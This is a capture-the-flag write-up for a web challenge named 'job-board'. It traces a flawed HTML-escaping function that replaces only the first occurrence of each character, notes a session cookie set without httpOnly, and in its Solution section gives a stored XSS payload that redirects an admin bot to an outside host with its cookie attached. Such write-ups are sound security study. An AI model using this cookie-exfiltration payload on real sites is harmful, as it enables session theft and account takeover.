#### job-board
- points earned: 111

#### Where's the flag?
- The flag is loaded into the `privateJobs` array.
	```javascript
	privateJobs.push(createJob('Flag Haver', `You keep the flag safe (${FLAG}). This is an internal job, not meant for the public.`, recruiter));
	```
- It is in the response body of a request to `/job/:id` where `id` is a uuid that cannot be guessed.
- An admin user gets a link to the flag on their `/` page.
- Knowing this information, and since the challenge comes with a bot, I know that the idea is to find an XSS to get control of the admin bot browser.

#### Notes / Intuition
- The first thing I noticed while going through the app is the block below. Without looking through any other code, I know there is an issue here because the javascript `replace` function only replaces one occurence of whatever is in the first param.
	```javascript
	function htmlEscape(s, quote=true) {
	  s = s.replace("&", "&amp;"); // Must be done first!
	  s = s.replace("<", "&lt;");
	  s = s.replace(">", "&gt;");
	  if (quote) {
	    s = s.replace('"', "&quot;");
	    s = s.replace('\'', "&#x27;");
	  }
	  return s;
	}
	```
	- This means that input like `<><h1>meow</h1>` will result in `&lt;&gt;<h1>meow</h1>` so html tags are not properly filtered.
- This can be used in either the `name` or `why` fields on a job application.
	- email field has some regex preventing this.
- The results can then be seen on the GET `/application/:id` route.
	- This will be the link given to the admin bot.
- Another thing to note is that after a user logs in, they are issues a cookie, but it is not an httpOnly cookie.
	```javascript
	return res
	    .cookie('session', sessionId)
	    .redirect('/');
	```
	- This allows us to exfil the admin cookie.
#### Solution
- Click on a job to apply to it.
- Complete the application including the below XSS in either the name or why fields.
	```html
	<><script>window.location=`https://exfil.com/HtoW_Q9v/meow.html?${document.cookie}`</script>
	```
	- nothing special here just a standard cookie exfil
- Send the application link to the admin bot.
- After cookie is received at exfil, use it to auth to the `/route`, get/goto the link for `Flag Haver` and the flag will be in the body.